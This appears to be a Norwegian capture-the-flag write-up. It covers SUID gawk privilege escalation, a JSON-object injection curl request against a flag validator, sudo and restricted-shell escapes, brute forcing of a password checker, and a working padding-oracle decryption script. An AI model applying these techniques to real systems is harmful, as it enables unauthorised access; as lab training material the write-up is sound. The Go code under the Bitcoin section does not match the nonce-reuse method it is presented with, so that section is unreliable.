### 1.5 Chiffermelding

```md
# Chiffermelding

Når man vil sende meldinger uten at andre lett kan lese dem, kan man bruke en form for chiffer for å gjøre teksten uforståelig.
Ser du imidlertid litt nærmere på bokstavene, er det lett å få rimelig mening ut av dem...
──────────────────────
nc chiffermelding 1337
──────────────────────
```

Ved å kjøre kommandoen så får vi følgende, og på slutten et felt for å skrive svaret:

```
Her har du en hemmelig melding:
omtfidogiriganøagmremfneohrraeareaenrldrsjekedeg
- Signert av Roscher Lund

Finn ut hva den opprinnelige meldingen var, og fortell meg hvem som skrev den
```

Den som har signert er Ragnvald Alfred Roscher Lund, og er en av de første sjefene innen etterretning i Norge. Det er også en bok som det også er hintet til i en senere oppgave:
[Svartkammeret : den innerste hemmeligheten](https://www.nb.no/items/URN:NBN:no-nb_digibok_2014072205024)
I den boken står det en del om begynnelsen av etterretningstjenesten i Norge, om kryptografi og eksempler. Blant annet hvordan denne skal løses. Løsningen på oppgaven her er triviell:

1. Begynn med den første bokstaven (o)
2. Hopp 3 hopp videre
3. Legg til bokstaven på den posisjonen (f)
4. Repeter 2-3 helt slutten av linjen
5. Begynn så med bokstav 2 (m)
6. Repeter 2-4, og til slutt det samme med bokstav 3 (t)

Resultatet blir `foraarforaarredmigingenharelsketdigømmereendjeg` og ved å legge inn en passende mengder mellomrom, så får man den opprinnelige meldingen. Hvis man ikke vet hvor det er hentet fra, så vil et raskt søk gi navnet på forfatteren som har skrevet det, som også er han/hun man skal skrive inn som svar for å få flagget.

### 1.6 Unchained

```md
# Unchained

Koble til med SSH med passord: EnergiskSkjorte
─────────────────────
ssh support@unchained
─────────────────────
```

Vi har fått tilgang til brukernavn, passord og hvor vi kan koble oss opp. Og i hjemmeområde så er det en fil som sikkert gir oss flagget:

```
unchained:~$ ls -al
total 4
dr-x------ 1 support support 24 Dec 28 15:52 .
drwxr-xr-x 1 root root 21 Dec 16 21:32 ..
-rw------- 1 root root 33 Dec 28 15:52 secret.txt
```

Men, så var det visst root som eier den filen og som er eneste som har tilgang til å lese den. For en vanlig bruker så kan det være mulig å bruke sudo, men da må denne være inkludert i `sudoers`-filen, og det er ikke vi. Det er ulike måter å likevel finne en vei inn, og i tilfellet her så kan vi lete etter et program som har suid satt i fil-tillatelsene: `find / -type f -perm -4000 2>/dev/null`. Det betyr at når programmet kjører så vil den kjøres med brukeren og rettighetene til den som eier den uten at vi trenger et passord.
Der finner vi blant annet at `gawk` har denne satt og eies av root. Awk er en ganske praktisk programspråk for å behandle tekstfiler, men den kan også vise innholdet i en fil: `gawk '{ print $0 }' secret.txt`. Det som er mellom krøll-parentes er scriptet vi vil kjøre med gawk og kjøres for hver linje, i tilfellet vårt så vil vi skrive ut hele linjen som vi angir med `$0` (`$1` gir første kolonne osv.), det går også an å bare skrive `print`. Navnet på filen vi vil se til slutt. Og da får vi se flagget.

### 1.7 Innslippsord

```md
# Innslippsord

Finner du ordet?
```

Her har vi fått en fil som spør om et passord. Måten jeg løste dette på er ved å bruke Ghidra til å "disassemble" filen. Det er bare en funksjon som er interessant her og det er `check_pw`:

```c
bool check_pw(long user_buf)
{
  byte calculated;
  bool res;
  int counter;
  byte pw_actual_buf [72];

  uint8_t pw_actual_buf[] = {
    0xb5, 0x48, 0x17, 0x2f, 0xb2, 0x55, 0x35, 0x0a,
    0x30, 0x80, 0xc9, 0xba, 0x01, 0x02, 0x03, 0x04,
    0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c,
    0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14,
    0x09, 0xf9, 0x79, 0xf1, 0x90, 0x18, 0x2a, 0x3a,
    0x04, 0xce, 0xff, 0xfd, 0x66, 0xd9, 0x9a, 0x30,
    0xcc, 0xfc, 0x23, 0xe3, 0x4d, 0x9b, 0xb7, 0x3c,
    0x6a, 0xe0, 0x63, 0x52, 0x84, 0x1d, 0x92, 0x27
  };
  counter = 0;
  do {
    if (0x1f < counter) {
      if (*(char *)(user_buf + 0x20) == '\0') {
        res = true;
      }
      else {
        res = false;
      }
lab_loop:
      return res;
    }
    if (*(byte *)(user_buf + counter) == 0) {
      res = false;
      goto lab_loop;
    }
    calculated = rol(pw_actual_buf[counter] ^ *(byte *)(user_buf + counter),counter + 1U & 7);
    if ((byte)(calculated ^ (char)counter * '\x03') !=
        (byte)((char)counter * '\x03' ^ pw_actual_buf[(long)counter + 0x20])) {
      res = false;
      goto lab_loop;
    }
    counter = counter + 1;
  } while( true );

```

Det er en del her som ikke er så interessant for å finne ut hva som skjer og noe er redundant, så det hopper jeg over. Men det som er hovedpunktene:

1. Vi har en buffer på 72 bytes, hvor 64 av de er hardkodet. Det er i praksis to deler hvor de 32 første fungerer som er en slags nøkkel og de 32 siste er hva som er forventet svar.
2. Passordet som er gitt til funksjonen (hva brukeren har skrevet) sammenlignes byte for byte, så den må være 32 bytes.
3. Henter så én byte fra nøkkelen, fra begynnelsen, og et tilsvarende fra svaret (altså 32 bytes etter)
4. Byten i tilsvarende posisjon fra brukeren, gjør vi en `XOR` på
5. Deretter roteres det på bitnivå med modulo 8 ganger til venstre, hvor første byte roteres 1 gang og så øker man i hver omgang.
6. Hvis svaret er lik med det som er forventet for alle 32 posisjonene, så har vi gyldig passord.

For å finne passordet så må vi gjøre det samme men motsatt.

### 1.8 Kryptogram

```md
# Kryptogram

Er du vår neste Egil Mørk? Tiden skrus tilbake til den mørke dagen 23. november 1935.
Som det vil sees er knekningen av et kryptogram ingen heksekunst, men det krever litt tålmodighet og at man prøver seg frem og tar fantasien til hjelp.
Benevnelser og arbeidsmetoder kan kanskje virke litt fremmed i første øyeblikk, men setter man seg inn i saken, er den i virkeligheten enkel.
Du kan hente kryptogrammet her:
──────────────────
nc kryptogram 1337
──────────────────
Besvarelsen du sender inn, finner du i innholdet av meldingen.
```

Henter:

```
Her er kryptogrammet:
øwbxl hjcbx læxmx fpxfx lmrcb xlpxo rvøpl rlvrc hrjlø cjxøp brdrb xbræs xlxbb xfhxl yxocx lwfxy øvwjf dryxf xjhhy føvæf apxcp jyxjf yxbøb bxfoj jmwfx mjdxf
```

Som kanskje ikke er så forståelig for ihvertfall de fleste. Men hvis man har lest i boken som er referert i oppgave 1.5, så har man i praksis fått svaret gitt, den gir også bakgrunn for både datoer og personer nevnt i teksten. Løsningen er et simpelt erstatnings-chifer og hver bokstav skal byttes ut med en annen. Et nyttig utgangspunkt er å bruke frekvensanalyse, og sammenligne med hvilke bokstaver som er hyppige i norsk.
```py
kryptogram = "øwbxl hjcbx læxmx fpxfx lmrcb xlpxo rvøpl rlvrc hrjlø cjxøp brdrb xbræs xlxbb xfhxl yxocx lwfxy øvwjf dryxf xjhhy føvæf apxcp jyxjf yxbøb bxfoj jmwfx mjdxf"
alfa = "abcdefghijklmnopqrstuvwxyzæøå"
beta = "utsv.r.pno.nm.lk.iy..gfed.ba."
for bokstav in kryptogram:
    if bokstav in alfa:
        print(beta[alfa.index(bokstav)], end="")
print()
```

Det ser ikke 100% ut, men derimot svaret som vi skal gi, er ikke hele teksten men kodeordet som er i slutten av den dekodede teksten.

### 1.9 NoSQL

```md
# NoSQL

Valider flaggene dine med vår flaggsjekker, som har innebygde tiltak mot SQL Injection for å sikre at flaggene er trygge.
https://nosql.ctf.cybertalent.no
```

Vi har også fått lagt ved index.js som viser kilden til websiden.
Umiddelbart ser det litt håpløst ut med en lang svarteliste av uttrykk, og det ser også ut som å bruke SQL injection blir vanskelig, siden det er mye som er blokkert. Men en svakhet som jeg fant til slutt er i validate funksjonen:

```js
app.post("/validate", async (req, res) => {
  let { flag } = req.body;

  if (!flag)
    return res
      .status(400)
      .json({ ok: false, error: "Can't check a missing flag." });

  let sql = "SELECT flag FROM flags WHERE flag = ? LIMIT 1";

  try {
    let [rows] = await db.query(sql, [flag]);
    flag = rows.length ? rows[0].flag : null;
    if (!flag) return res.json({ ok: false, message: "That flag is invalid!" });
    return res.json({ ok: true, message: `${flag} is a valid flag!` });
  } catch (err) {
    console.error("DB error:", err);
    return res.status(500).json({ ok: false, error: "db error" });
  }
});
```

Det er et par ting som må bli riktig her, først så må flagget evalueres til noe som ikke er usant (altså i praksis ikke være tom eller false) av javascript. Deretter må det også tilsvarende gjøres i SQL uttrykket, altså flag må ha en verdi av sann, som igjen også må evalueres til sant av javascript. I tillegg så må det være gyldig JSON-format. Det som til slutt ble noe som faktisk fungerte for «alle» parter ble å kjøre en POST request slik:

```
curl -X POST https://nosql.ctf.cybertalent.no/validate -H "Content-Type: application/json" -d '{"flag": {"flag": 1}}'
```

Og jeg fikk et flagg! Det som skjer her er at hele uttrykket er «sant» så vi har et uttrykk, og uttrykket til sammen bytter ut ? i SQL-spørringen til i praksis flag = true. Så da får vi flagget!

### 1.10 Breakout

```md
# Breakout

Koble til med SSH:
──────────────────
ssh user1@breakout
──────────────────
og bruk passord: EssensieltFantom

## Tips

For å bytte bruker inne på maskinen brukes su - brukernavn
For hver bruker leter du etter en .txt fil med samme navn. Denne inneholder brukernavn:passord for neste bruker.
I enden venter det et flagg.
```

Oppgaven er enkel i prinsipp, men det er selvfølgelig skjær i sjøen, men først:

```
user1@breakout's password:
breakout:~$ ls -al
total 4
dr-x------    1 user1    user1           23 Jan  3 16:11 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw----r--    1 root     root            27 Jan  3 16:11 user1.txt
```

For den første brukeren så holder det med `cat user1.txt` for å få brukernavn og passord til neste.

```
breakout:~$ su - user2
Password:
breakout:~$ ls -al
total 4
dr-x------    1 user2    user2           24 Jan  3 16:11 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw----r--    1 root     root            27 Jan  3 16:11 .user2.txt
```

Det går greit også for neste, men hvis man bruker `ls` alene uten valg, så vil man kanskje ikke oppdage det. Vi kan bruke `cat .user2.txt` for neste. Hos neste bruker:

```
breakout:~$ su - user3
Password:
breakout:~$ ls -al
total 4
dr-x------    1 user3    user3           32 Jan  3 16:11 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw----r--    1 root     root           184 Dec 16 21:14 note.txt
dr-x-----x    1 root     root            38 Dec 16 21:14 secret_information
```

Her blir det litt værre, siden vi ikke har en `user.txt`, men vi har `note.txt` som forteller oss:

```
At long last I found the secret information
It has always been my greatest goal
But at the end of it all I was told
The rumoured super_secret_information
Still remains elusive as ever
```

Vi har allerede `secret_information` her, men hva med `super_secret_information`? Dessuten så kan ikke vi lese mappen ved hjelp av `ls` siden vi ikke har tillatelse. Men tillatelser er som regel ikke nødvendigvis de samme selv rekursivt nedover mappestrukturen, så hvor kan man putte `super_secret_information`? Kanskje inne i `secret_information`?

```
breakout:~$ ls -al secret_information/super_secret_information
total 64
dr-x---r-x    1 root     root            23 Jan  3 16:11 .
dr-x-----x    1 root     root            38 Dec 16 21:14 ..
-r-x---r-x    1 root     root         61126 Dec 12 20:42 transaction.png
-rw----r--    1 root     root            27 Jan  3 16:11 user3.txt
```

Nice, der var `user3.txt`. Vi har også er annen fil, kanskje vi kan finne noe i den og? Det får vi se på senere. (Et tips for å hente ut filer er å bruke `base64` til å kode de, og så `base64 --decode` for å dekode tilbake på lokal maskin.)

```
breakout:~$ su - user4
Password:
breakout:~$ ls -al
total 4
dr-x--x---    1 user4    nisser          23 Jan  3 16:11 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw-r-----    1 root     nisser          27 Jan  3 16:11 user4.txt
```

Ok, så vi har `user4.txt`, men den er eid av `root`, men også gruppen `nisser` og nå har vi ikke lesetilgang! Nissene har lesetilgang derimot. For å finne medlemmer av gruppen så kan vi skrive `getent group nisser`. Og selvfølgelig er jo `julenissen` medlem. En annen måte å finne ut tilganger, er å sjekke om vi kan bruke `sudo`. Vi kan skrive `sudo -l`, for å liste spesielle tilganger:

```
breakout:~$ sudo -l
User user4 may run the following commands on breakout:
    (julenissen) NOPASSWD: /bin/cat
```

Det betyr at vi kan kjøre `sudo cat`. Mjau. Vi trenger vårt eget passord og må skrive inn hvilken bruker vi vil kjøre `sudo` som, ellers blir det automatisk root: `sudo -u julenissen cat user4.txt`. Voila! Så fortsetter vi, men:

```
breakout:~$ su - user5
Password:
user5@breakout:~$ ls -al
-bash: ls: command not found
```

Men vi kan prøve f.eks. /bin/ls:

```
user5@breakout:~$ /bin/ls -al
total 16
dr-x------    1 user5    user5           23 Jan  3 16:11 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw-r--r--    1 root     root          1195 Dec 16 21:14 .bash_profile
-rw-r--r--    1 root     root           711 Dec 16 21:14 .bashrc
-rw-r--r--    1 root     root            61 Dec 16 21:14 .inputrc
drwxr-xr-x    2 root     root            16 Dec 16 21:14 bin
-rw----r--    1 root     root            27 Jan  3 16:11 user5.txt
```

Ser bedre ut nå og vi finner også /bin/cat og kan hoppe videre. Ok, så hva nå:

```
user5@breakout:~$ /bin/su - user6
Password:
~$ ls -al
No whitespace allowed
~$ ls
bin       flag.txt
```

Hva er nå det for noe tull? No whitespace? Vi må finne på noe som lar oss omgå den begrensningen. Ikke kan vi kjøre nytt shell heller. Ser ut som begrensningen ikke gjelder alt. Vi kan lese inn en fil ved hjelp av f.eks. vim, så vi kan bruke `/usr/bin/vi` og `:e flag.txt`. Alternativt kan man også bruke `su` via forrige bruker slik `su - user6 -c "cat flag.txt"` eller `su - user6 -c "bash"`.

### 1.11 Solveme

```md
# SolveMe

Finn passordene for å dekryptere flaggene
```

Så simpelt og enkelt! Det følger med flere filer, en for å kjøres på linux, og to for hhv. 32/64-bit windows. Denne ser ut som en litt mer avansert utgave av oppgave 1.6. Ihvertfall går jeg fram med Ghidra, og her har vi også flere funksjoner for å sjekke passord, som vi også ser når vi kjører programmet. Den første er et passord i klartekst `SuperSecretPass!` og gir også første flagget. Funksjonene er «mangled» så det er nok kompilert fra C++, så det gjør det litt vesentlig å kunne jobbe fra eller importere nødvendige filer for å dekompilere til noe sensibelt.
I `checkPassword2` så er det en for-løkke som kjører 16 ganger, og det er en klartekst-streng `What a beautiful password you have chosen for yourself!` Og det ser ut som vi legger på +5 på indeksene, så vi kan prøve `a beautiful pass`. Og det fungerer!
I neste, `checkPassword3` så ser det litt mer avansert, vi har noen strenger `Do you always remember all your passwords that well?` og `Do not waste my time!`. Den siste er hvis passordet ikke er nøyaktig 16 tegn langt, så da vet vi at det må være så langt. Det er noen hardkodete verdier

```c
local_c8[0] = 0x8f745590;
local_c8[1] = 0x6b838889;
local_c8[2] = 0x8c5d8485;
local_c8[3] = 0x6283616a;
```

Men i seg selv å gir de ikke så mye mening, og mye annen kode fortsetter, men litt fram og tilbake, så ser det ut som vi først kopierer input til en buffer, og som kjører en løkke som sammenligner med disse verdiene:

```
j = 0;
  for (i = 0; i < 4; i = i + 1) {
    xor_maske = j * 0x1010101 + 0x10203;
    j = j + 4;
    if (local_c8[i] != (xor_maske ^ (passord + i * 4)) + 0x23232323) {
     / * snip */
     exit(1);
    }
  }
```

Ved å ta bort «støy» og kode som ikke er relevant for sjekken, så ser det ut som vi kan finne ut av det. Vi kan lage en python som reverserer

```py
hardkodet = [0x8F745590, 0x6B838889, 0x8C5D8485, 0x6283616A]
funnet = ""
j = 0
for i in range(4):
    xor_maske = j * 0x1010101 + 0x10203
    j += 4
    passord_del = xor_maske ^ (hardkodet[i] - 0x23232323)
    for heks in range(4):
        funnet += chr((passord_del >> (heks * 8)) & 0xFF)
print(funnet)
```

Det gir oss `n0PlaceLik3aH0m3`, som får oss enda et hakk videre.
checkPassword4 er neste i trinnene, begynnelsen er kjent men nå trenger vi bare 4 tegn. Interessant er også at slutten har et «invalid character detector» og som ser ut som feiler om vi har tegn som ikke er etter `0x28` «(» og `0x7d` «}», det skulle bety `a` til `z` med små bokstaver. Og for å gjøre ting enklere, så hva med å kjøre en «brute force», det er ikke veldig mange varianter.
Kan bruke Python:

```py
import string
import subprocess
import time
from itertools import product

pass1 = "SuperSecretPass!"
pass2 = "a beautiful pass"
pass3 = "n0PlaceLik3aH0m3"
pass4 = ""

rs_list = []
with open("output", "wb") as op:
    for i, pass4 in enumerate(product(string.ascii_lowercase, repeat=4)):
        input_pw = pass1 + "\n" + pass2 + "\n" + pass3 + "\n" + "".join(pass4) + "\n"
        input_pw = input_pw.encode()
        rs = subprocess.run(
            ["./solveMe"],
            input=input_pw,
            capture_output=True,
        )
        if rs.stdout.count(b"FLAG") > 3:
            print(pass4, rs.stdout)
        if rs.stdout.count(b"}") > 3:
            rs_list.append(rs.stdout)
        if i % 7000 == 0:
            print(pass4)
            op.write(b"".join(rs_list))
            rs_list = []
            time.sleep(1)
```

Denne versjonen er litt modifisert for å sjekke omdet var andre. I originalversjonen sjekket jeg ikke for FLAG og } men har lagt til det for å se om det var andre varianter, og orginalt så lagret jeg alle variantene. Uansett så fant jeg flagg, og det siste passordet var `qbit`.

### 1.12 Ubalansert

```md
# Ubalansert

RSA er ofte brukt for å kryptere meldinger, men bare hvis implementasjonen av algoritmen er gjort korrekt.
Hvis man underveis velger å vike for standarende som finnes, vil det føre til at krypteringsalgoritmen ikke er sikker, og den orginale meldingen kan lett bli forsert gjennom kryptoanalyse.
I denne oppgaven har vi implementert krypteringsalgoritmen på en sårbar måte.
```

Det er flere måter å angripe, men dette er antageligvis AES med CBC/CFB og den krypterte koden er ny hver gang vi starter, så vi er nødt til å løse ved hjelp av de kommandoene (krypter/dekrypter). Det er en kjent måte å angripe på ved å sende en streng med et antall 0 (null). Krypteringen skjer i blokker som har en bestemt lengde, og kan være f.eks 16 bytes i en 64 bytes krypteringsstreng. I AES så har vi det som kalles for IV eller initialiseringsvektor som brukes for å kryptere den første blokken. Men når vi sender bare nuller og skal kryptere, så vil den første blokken inneholde IV, og dermed vet vi hva den er.
Helt rett fram er det ikke siden siste byten kan være padder, så må vi prøve ut, altså har vi 15 nuller og siste kan være alle varianter som er 256 ulike. Programmet sier fra når det ikke fungerer, så det er bare å prøve alle til vi lykkes.
Når vi nå har IV så er det i grunnen samme prosess for å dekryptere, bortsett fra at vi begynner med IV i stedenfor 0’ene, og neste blokk bruker forrige blokk. Her er en Python som gjør dette så å si automatisk:

```py
import socket
import ast

def xor(b1, b2):
    return bytes(a ^ b for a, b in zip(b1, b2))

class WannaPwn:
    def __init__(self, host, port):
        self._sokk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sokk.connect((host, port))
        self._buff = b""
        self._hekseflagg = ""

    def lestil(self, t):
        while t not in self._buff:
            d = self._sokk.recv(512)
            if not d:
                break
            self._buff += d
        p = self._buff.find(t)
        rs = self._buff[:p + len(t)]
        self._buff = self._buff[p + len(t):]
        return rs.decode()

    def hentflagg(self):
        self.lestil(b"Flagget er: ")
        self._hekseflagg = self.lestil(b"\n").strip()
        return self._hekseflagg

    def enc(self, t):
        self.lestil(b"> ")
        self._sokk.sendall(b"1\n")
        self.lestil(b"krypter melding > ")
        self._sokk.sendall(t.encode() + b"\n")
        return self.lestil(b"\n").split(" = ")[1].strip()

    def dec(self, t):
        self.lestil(b"> ")
        self._sokk.sendall(b"2\n")
        self.lestil(b"ciphertekst i hex> ")
        self._sokk.sendall(t.encode() + b"\n")
        ln = self.lestil(b"\n")
        if "pt = " in ln:
            return ln.split(" = ")[1].strip()
        return None

KJENT = "vil du ha dette?"
BLOKK_LN = 16

apollo = WannaPwn("apollo", 1337)

# finn IV
kodet_flagg = bytes.fromhex(apollo.hentflagg())
print(len(kodet_flagg))
if kodet_flagg[:BLOKK_LN].hex() == apollo.enc(KJENT)[:BLOKK_LN<<1]:
    print("Bra flagg")
blokker = [kodet_flagg[i:i+BLOKK_LN] for i in range(0, len(kodet_flagg), BLOKK_LN)]
res_nuller = bytes.fromhex(apollo.enc("\x00" * BLOKK_LN))[:BLOKK_LN]
iv = None
for pad in range(256):
    alt_blokk = b"D" * (BLOKK_LN-1) + bytes([pad])
    midl = apollo.dec(alt_blokk.hex() + res_nuller.hex())
    if midl:
        if midl.startswith("b'"):
            midl = ast.literal_eval(midl)
        else:
            midl = bytes.fromhex(midl)
        iv = xor(midl[BLOKK_LN:BLOKK_LN<<1], alt_blokk)
        print(iv.hex())
        break

# dekrypter flagg
plain = b""
forrige_blokk = iv
for n, blokk in enumerate(blokker):
    funnet = False
    for pad in range(256):
        alt_blokk = b"D" * (BLOKK_LN-1) + bytes([pad])
        midl = apollo.dec(alt_blokk.hex() + blokk.hex())
        if midl:
            if midl.startswith("b'"):
                midl = ast.literal_eval(midl)
            else:
                midl = bytes.fromhex(midl)
            padln = ((BLOKK_LN<<1) - len(midl))
            p2_blokk = midl[BLOKK_LN:] + bytes([padln] * padln)
            plain_blokk = xor(xor(p2_blokk, alt_blokk), forrige_blokk)
            plain += plain_blokk
            forrige_blokk = blokk
            funnet = True
            break
    if not funnet:
        print(f"Blokk {n} er ikke snill")
print(len(plain))
print(plain)
print(plain.decode(‘latin-1'))
```

### 2.9 Musikktrøbbel

```md
# Musikktrøbbel

GooodGames har hatt julebord og har lagt ut noter som folk kan lese dersom de ikke har hørt sangene før.
Ryktene sier at de forventer at ansatte kan litt om musikkteori og steganografi.
```

I tillegg så har vi fått en PNG som viser notene til «Jingle Bells». Teksten hinter til både steganografi og musikkteori, så da får vi se litt på det. Selve bildefilen hvis man ser litt nærmere, så har vi noen piksler (64) øverst i venstre hjørne som skiller seg ut, det er også litt mer «ruglete» fram til ca midten av bildet.
En klassisk måte å skjule noe i en PNG fil, er å lagre i de «minst signifikante bit’ene» (LSB). Det er så og si umulig å få øye på når man ser på bildet, men fungerer veldig bra for lagring siden PNG ikke er «lossless». Hver piksel kan bestå av fra normalt én fargekanal (typisk gråtoner), 3 kanaler (RGB), eller 4 (RGBA) som inkluderer «alpha» eller hvor gjennomsiktig punktet er. Hver av kanalene lagrer med et visst antall bits, som typisk er 8 (bit-ord med størrelse byte). Men vi kan hente ut det som kalles for bitplane, Bitplane er hvilket bit i bit-ordet, og går fra f.eks. mest til minst signifikante bit. Det er i motsatt til lagring av hele kanal-verdien, som innholder hele bit-ordet som er hvordan det faktisk er lagret før komprimering. Vi ender da opp med f.eks 8 bit-strømmer eller bit-plan per kanal.
Her er det en kombinasjon, det er en fil som er lagret i LSB-bitplanet, og så har vi i de tre neste bitplanene lagret 3 ulike strømmer med data, men det er bare i de første 64 pikslene. Det er enkelt å hente dette ut ved hjelp av Python og PIL, på samme måte som i forrige steganografi oppgave, men denne gangen henter vi ut hvert bitplan. Vi finner en fil i LSB og må bare passe på å trimme vekk strømmen med 0xFF på slutten. Det er en ZIP fil med en bildefil Noel.png.
Her dukker en nytt problem, selv om vi har ZIP-filen, så er den passord-beskyttet og med moderne AES-kryptering så er ikke den så lett å dekryptere. Men vi får se på de gjenværende dataene vi henter ut av bildet:

```
Kanskje akkordene kan hjelpe?...
De er ikke 0-indeksert .........
Okei, da, litt bedre hint: F=4..
```

Så da var det kanskje musikkteorien som skal testes? Vi får først begynne med å se på notene, de er C D E F G A H C i en typisk skala, da kan det passe med C=1, D=2, E=3, F=4, G=5, A=6, H=7. Akkordene over er faktisk 32 og er:

```
C C C F F G G
C C C C F F G
G C C C C C F
C D G C C C C
F C/G G C
```

Jeg byttet ut og prøvde å få pakket ut, men ikke tok det passordet. I ettertid, ser det ut som unzip jeg brukte ikke skjønte passordet selv om det også var riktig. Trist mjau.

### 2.18 Bitcoin

```md
# bitcoin

Våre operatører har fanget opp noe vi mener er en nettbasert transaksjon.
Vi har grunn til å tro at avsenderen har kryptert en datamengde du kan være interessert i, ved å bruke privatnøkkelen sin som en éngangsnøkkel (OTP).
Kjør følgende kommando for å koble til endepunktet og motta den krypterte datamengden samt transaksjonen:

───────────────
nc bitcoin 8333
───────────────

Flagget består av de første 16 bytene av det dekrypterte innholdet.
```

Når vi går inn på maskinen, så får vi først den krypterte meldingen, og så en stor transaksjonsoversikt.
Siden det er brukt samme private nøkkel og nonce. The er en kjent svakhet som kalles nonce-reuse.
Vi kan ta froskjellen mellom signaturene (hash) i hver transaksjon, og det bør gi oss noncen.
Vi må vite at Bitcoin bruker secp256k1 og ikke NIST sine.
Vi har
$$k=\frac{(z_1-z_2)}{(s_1-s_2)} (\mod N)$$
Hvor $k$ er nonce, $z$ er signatur-hash, $s$ er signatur (proof) og $N$ er "grupperekke" fra secp256k1.
så har vi
$$d=\frac{s_1k-z_1}{r} (\mod N)$$
Her er $d$ den private nøkkelen, og $r$ er "punkt" på kurven. $s,r$ er "public" i en bitcoin.
For implementasjonen så må vi bruke modulo inverse når vi skal dele, ellers blir det ikke korrekt.
Når vi har den private nøkkelen så er svaret den krypterete meldingen XOR med denne.

```go
package main

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"os"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: go run signer.go <private_key_path> <script_path>")
		os.Exit(1)
	}

	keyBytes, err := os.ReadFile(os.Args[1])
	if err != nil { panic(err) }

	block, _ := pem.Decode(keyBytes)
	priv, err := x509.ParsePKCS8PrivateKey(block.Bytes)
	if err != nil { panic(err) }

	scriptData, err := os.ReadFile(os.Args[2])
	if err != nil { panic(err) }

	hash := sha256.Sum256(scriptData)
	signature, err := rsa.SignPKCS1v15(rand.Reader, priv.(*rsa.PrivateKey), crypto.SHA256, hash[:])
	if err != nil { panic(err) }

	fmt.Printf("X-Signature: %s\n", base64.StdEncoding.EncodeToString(signature))
}
```
